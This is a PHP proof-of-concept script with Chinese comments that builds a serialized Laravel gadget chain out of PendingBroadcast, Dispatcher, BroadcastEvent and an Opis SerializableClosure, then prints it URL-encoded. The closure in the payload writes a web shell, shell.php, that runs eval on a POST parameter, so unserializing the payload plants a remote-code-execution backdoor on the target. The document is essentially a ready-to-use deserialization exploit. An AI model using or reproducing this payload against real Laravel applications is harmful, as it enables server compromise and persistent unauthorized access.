<?php

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver){
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace Illuminate\Broadcasting {

    class BroadcastEvent {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}



namespace {
    require "./vendor/autoload.php";  // 需要在本地安装此组件

    $func = function(){file_put_contents("shell.php", "<?php eval(\$_POST['Dig2']) ?>");};
    $d = new \Opis\Closure\SerializableClosure($func);  // 调用函数
    $c = new Illuminate\Broadcasting\BroadcastEvent('hacked by Dig2');  // 这个参数不重要
    $b = new Illuminate\Bus\Dispatcher($d);  // 调用 call_user_func($d, $c)
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c); // 调用$b->dispatch($c)
    print(urlencode(serialize($a)));
}

